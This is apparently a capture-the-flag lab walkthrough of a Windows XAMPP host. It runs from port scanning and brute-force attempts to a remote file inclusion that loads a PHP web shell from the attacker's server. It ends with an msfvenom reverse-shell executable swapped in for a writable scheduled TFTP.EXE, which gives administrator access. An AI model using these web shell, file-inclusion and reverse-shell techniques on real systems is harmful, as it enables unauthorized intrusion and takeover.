### Enumeration
```
IP=192.168.198.53
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p21,135,139,445,3306,4443,5040,7680,8080,49665,49666,49667,49668,49669 -A $IP
nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 21
	- FileZilla ftpd 0.9.41 beta
- 135
	- RPC
- 139
	- RPC
- 445
	- smb
- 3306
	- mysql
- 4443
	- Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
	- XAMPP
- 5040
	- unknown
- 7680
	- pando-puub
- 8080
	- Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
	- XAMPP
- 49664
	- RPC
- 49665
	- RPC
- 49666
	- RPC
- 49667
	- RPC
- 49668
	- RPC
- 49669
	- RPC
### Foothold
- 21
	- ftp anonymous@$IP
		- failed
		- 220-FileZilla Server version 0.9.41 beta
		- 220-written by Tim Kosse (Tim.Kosse@gmx.de)
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
		- nothing
- RPC/ SMB
	- enum4linux $IP
		- nothing
	- Rid brute
		- crackmapexec smb IP -u guest -p "" --rid-brute
			- guest disabled
		- crackmapexec smb $IP --rid-brute
			- access denied
- 445
	- smbclient -N -L //$IP
		- access denied
	- nmap --script smb-vuln* -p135,139,445 $IP
		- nothing
- SQL
	- Mysql
		- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://$IP
			- Cant connect
- 4443
	- Default landing page
		- ![[Pasted image 20240816135407.png]]
	- Versions
	- Directory Brute force
		- dirsearch -u http://$IP
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
	- Vulnerability scan
		- nikto -h http://$IP
- 8080
	- Default landing page
		- ![[Pasted image 20240816135426.png]]
	- Versions
	- Directory Brute force
		- dirsearch -u http://$IP:8080
			- /site
				- ![[Pasted image 20240816140141.png]]
				- LFI
					- http://192.168.198.53:8080/site/index.php?page=../dashboard/phpinfo.php
						- Loads php info
					- Random website: http://192.168.198.53:8080/site/index.php?page=test.php
						- ![[Pasted image 20240816140544.png]]
						- This says it includes php from other php sites
						- We can potentially host a php and execute commands?
							- `echo '<?php echo system($_GET["cmd"]); ?>' > basicwebshell.php
							- python3 -m http.server 80
							- http://192.168.198.53:8080/site/index.php?page=http://192.168.45.163:80/basicwebshell.php&cmd=whoami
							- ![[Pasted image 20240816140733.png]]
							- We can execute commands
							- Used base 64 PS rev shell
			- /dashboard
			- /Webalizer/
				- empty
			- /xampp/
				- empty
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
	- Vulnerability scan
		- nikto -h http://$IP
### PE
#### Windows
- `slort\rupert
	- whoami /all
		- SeChangeNotifyPrivilege enabled
		- SeShutdownPrivilege, SeUndockPrivilege, SeIncreaseWorkingSetPrivilege, SeTimeZonePrivilege  disabled
	- Root drive directory
		- Backup
			- info.txt
				- Run every 5 minutes
				- `C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
			- TFTP.EXE
				- icacls TFTP.EXE
					- Authenticated Users:(I)(M)
					- We can modify file. Probably just put msfvenom exe
				- Payloads
					- msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.163 LPORT=21 -f exe > TFTP.EXE
						- mv TFTP.EXE TFTP_back.EXE
						- Now we wait
						- Connected but unresponsive
					- msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.163 LPORT=21 -f exe > TFTP.EXE
						- Gets shell as administrator
### Credentials
### Lessons Learned